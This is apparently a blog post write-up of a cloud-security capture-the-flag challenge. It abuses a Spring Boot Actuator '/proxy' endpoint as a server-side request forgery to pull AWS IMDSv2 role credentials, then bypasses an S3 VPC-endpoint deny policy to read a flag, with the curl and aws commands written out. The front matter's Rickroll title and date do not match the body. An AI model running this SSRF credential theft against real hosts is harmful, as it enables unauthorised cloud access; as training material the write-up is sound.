---
layout: post
title: "Operation: Get Ricked"
description: "Using knowledge about ClickFix phishing campaigns and hardware hacking to Rickroll my friends and family."
date: 2025-04-01
# image_base: /assets/images/posts/2025-04-01-Operation-Get-Ricked
---
Wiz Cloud Security CTF — Challenge 1: Perimeter Leak
====================================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*U9vd2_tf19EMGE9JSNrpTg.png)

In early June, Wiz launched a monthly [cloud security CTF](https://cloudsecuritychampionship.com) designed to give participants hands-on experience with real-world cloud security scenarios. I joined in and decided to document my journey along the way. This post is my write-up of the first challenge. Hope you enjoy!

Challenge 1: Perimeter Leak
---------------------------

After weeks of exploits and privilege escalation you’ve gained access to what you hope is the final server that you can then use to extract out the secret flag from an S3 bucket. It won’t be easy though. The target uses an AWS data perimeter to restrict access to the bucket contents. Good luck!

`You’ve discovered a Spring Boot Actuator application running on AWS: curl [https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com](https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com) {“status”:”UP”}`

Spring Boot Actuator
--------------------

The first challenge centers on bypassing an AWS data perimeter to retrieve a flag from an S3 bucket. Along with the instructions, we’re given access to a Spring Boot Actuator application running in AWS. I didn’t know what Spring Boot or Spring Boot Actuator was but some quick googling reveals that Spring Boot is a Java-based framework for building applications to support web applications and microservices. Spring Boot Actuator is a feature within Spring Boot that provides HTTP endpoints allowing users to interact with and collect information from the running application such as health status, metrics, info, etc.

Luckily, I found a blog published by Wiz [Exploring Spring Boot Actuator Misconfigurations](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations) and how to exploit them. The blog describes that by default, older versions of Spring Boot Actuator publicly expose some juicy endpoints like `/heapdump` which can contain credentials and other sensitive information. The blog discusses other common misconfigurations and high-value endpoints including `/gateway/routes`, `/env`, `/metrics`, `/threaddump`, and `/scheduledtasks`. Here we can see a list of the challenge’s exposed Spring Boot Actuator endpoints.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BxF37OeyCJBdG-2mRlW_xg.png)

Unfortunately, this Spring Boot Actuator instance didn’t have `/heapdump` or `/gateway/routes/` publicly exposed and a search through `/env` and `/threaddump` with `strings` turned up no credentials or tokens. Time to use a hint…

> Spring Boot Actuator applications may be misconfigured to allow access to `/actuator/mappings`.

In this case, it wasn’t much help since I had already discovered the `/mappings` endpoint. The second hint, however, is interesting:

> “The endpoint `/proxy` can be used to obtain IMDSv2 credentials.”

This is much more useful information as I had overlooked the `/proxy` endpoint in my initial review of `/mappings` which also shows it accepts URL parameters.

```
{
    "predicate": "{ [/proxy], params [url]}",
    "handler": "challenge.Application#proxy(String)",
    "details": {
        "handlerMethod": {
            "className": "challenge.Application",
            "name": "proxy",
            "descriptor": "(Ljava/lang/String;)Ljava/lang/String;"
        },
        "requestMappingConditions": {
            "consumes": [],
            "headers": [],
            "methods": [],
            "params": [{
                "name": "url",
                "negated": false
            }],
            "patterns": ["/proxy"],
            "produces": []
        }
    }
}
```

Stealing Credentials
--------------------

Using [AWS EC2 documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) and this great [blog by @MorattiSec on stealing IMDS credentials](https://medium.com/@MorattiSec/coding-a-aws-pentest-tool-stealing-ec2-instance-role-credentials-imdsv1-imdsv2-compatible-21e565372054), I was able to make a web request to get credentials from the `challenge01-5592368` IAM role!

``TOKEN=`curl -X PUT “[https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token](https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fapi%2Ftoken)" -H “X-aws-ec2-metadata-token-ttl-seconds: 21600”` && curl -H “X-aws-ec2-metadata-token: $TOKEN” [https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368](https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2Fchallenge01-5592368)``

This gives us an AccessKeyId, SecretAccessKey, and Token and after looking in `/latest/meta-data/iam/info`, we can see these credentials are for the ARN `arn:aws:iam::092297851374:instance-profile/challenge01-b18ca40`.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ln9cjJ3pm4L5u0g2Jhh-Dw.png)

You Can’t S3 Me
---------------

Figuring out how to use these credentials to get access to the S3 bucket containing the flag would be my next challenge. This [AWS documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html) describes how we can utilize the newly acquired credentials by setting them as environment variables.

```
export AWS_ACCESS_KEY_ID=*
export AWS_SECRET_ACCESS_KEY=*
export AWS_SESSION_TOKEN=*
```

However, despite having these credentials, I do not know the name of the S3 bucket holding the flag. I tried accessing `challenge01-b18ca40` with the AWS S3 list command but unfortunately it is not a valid bucket name.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jjYuZMmoSXVl_m4f-Z2YSA.png)

Back to the drawing board, I start digging through the exposed `/actuator/env` endpoint again. This comes in clutch as it contains a systemEnviroment property called “BUCKET”.

```
{
    "name": "systemEnvironment",
    "properties": {
        "BUCKET": {
            "value": "challenge01-470f711",
            "origin": "System Environment Property \\"BUCKET\\""
        },
    }
}
```

Trying to access this S3 bucket instead reveals a file `hello.txt` and a folder called `private` containing `flag.txt`! I just need to copy and read the file to my local machine aaaaaaaaaaannd 403 error… 🙃

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XICFgZTYaQRlnGOM23iHdQ.png)

Trying to sync the S3 bucket to my local machine with the `aws s3 sync` command reveals that it is a permissions issue preventing us from accessing the flag.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LZSbU0YkpeBPxJ6xah_4CQ.png)

I caved and used the final hint:

> “A pre-signed URL will be helpful.”

Using the command `aws s3 presign s3://challenge01–470f711/private/flag.txt — region us-east-1` works to create a URL for the S3 bucket but that does not give us access to the flag either.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_4bx5xwiSfjVVRg1NVtFfQ.png)![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NWvqJy3VaKdwBTrWWFLVhQ.png)

We need to figure out how to access this S3 bucket so a good starting point is reading the policy blocking us from accessing it. We can do this by running the command `aws s3api get-bucket-policy --bucket challenge01-470f711`. The resulting policy below tells us a few things.

`{“Policy”: “{”Version”:”2012–10–17”,”Statement”:[{”Effect”:”Deny”,”Principal”:”*”,”Action”:”s3:GetObject”,”Resource”:”arn:aws:s3:::challenge01–470f711/private/*”,”Condition”:{”StringNotEquals”:{”aws:SourceVpce”:”vpce-0dfd8b6aa1642a057”}}}]}”}`

1.  “Effect”: ”Deny” — This is a deny rule
2.  “Principal”: ”*” — This policy applies to all entities.
3.  “Action”: “s3:GetObject” — This policy applies to the s3:GetObject action.
4.  “Resource”: “arn:aws:s3:::challenge01–470f711/private/* — The AWS resource the policy applies to.
5.  “StringNotEquals”: {“aws:SourceVpce”: “vpce-0dfd8b6aa1642a057}” — The policy triggers when the request comes from any source _not equaling “vpce-0dfd8b6aa1642a057”._

Bingo! The goal now is to route the S3 request through the `vpce-0dfd8b6aa1642a057` VPC endpoint. After numerous over-complicated ideas and failed attempts, I realized that I could use the Spring Boot Actuator `/proxy` endpoint from earlier. It took even longer to realize the S3 presigned URL had to be URL-encoded before passing it as a parameter to `/proxy`. Ironically, the simplest step ended up taking me the longest but with the encoded S3 URL stored in a variable, the below curl request finally prints the flag!

`curl [https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=$Encoded_Presigned_URL](https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=%24Encoded_Presigned_URL)`

One down, 11 more to go!

_I appreciate you taking the time to read my blog! :)_